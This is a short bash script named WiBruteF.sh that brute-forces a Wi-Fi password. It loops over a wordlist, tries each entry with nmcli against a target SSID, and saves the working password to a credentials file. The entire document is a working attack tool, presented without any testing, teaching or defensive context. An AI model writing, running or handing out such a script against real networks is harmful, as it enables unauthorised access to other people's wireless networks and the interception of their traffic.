#!/usr/bin/bash

ssid=$1
wordlist=$2

usage() {
echo "usage :"
echo
echo "  WiBruteF.sh <SSID> <WORDLIST>"
}


function bruteforce {

for password in $(cat $wordlist);
do
trytoconnect=$(nmcli --wait 3 dev wifi connect "$ssid" password $password &> /dev/null)
result=$?
if [ $result = 0 ];
then
echo "successfully connected ! using password : $password "
echo "ssid : $ssid " > $ssid-cred.txt
echo "password : $password" >> $ssid-cred.txt
break
else
echo "failed to connect using password : $password "
fi
done;

}



if [ $# -lt 2 ];
then
usage
elif [ $# -eq 2 ];
then
echo "targeting : [ $1 ] wifi network "
bruteforce
fi
